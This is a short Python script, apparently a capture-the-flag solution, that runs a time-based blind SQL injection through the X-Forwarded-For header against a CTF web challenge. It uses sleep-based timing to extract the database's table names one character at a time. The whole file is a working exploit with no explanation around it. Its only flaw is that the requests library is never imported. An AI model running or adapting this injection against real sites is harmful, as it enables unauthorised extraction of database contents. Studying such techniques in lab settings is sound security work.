url = 'http://ctf5.shiyanbar.com/web/wonderkun/index.php'
tables = ''
for i in range(1,15):
    for each in range(30,127):
        headers={
                "X-Forwarded-For":"1' and case when(ascii(substring((select group_concat(table_name separator ';') from information_schema.tables where table_schema='web4') from %s for 1))=%s) then sleep(6) else 0 end and 'a'='a" % (i,each)
                }
        try:
            r = requests.get(url, headers=headers, timeout=6)
            print(" "+r.text)
        except:
            tables += chr(each)
            print("")
            print(chr(each))
            print("")
            break

print("tables: %s" % tables)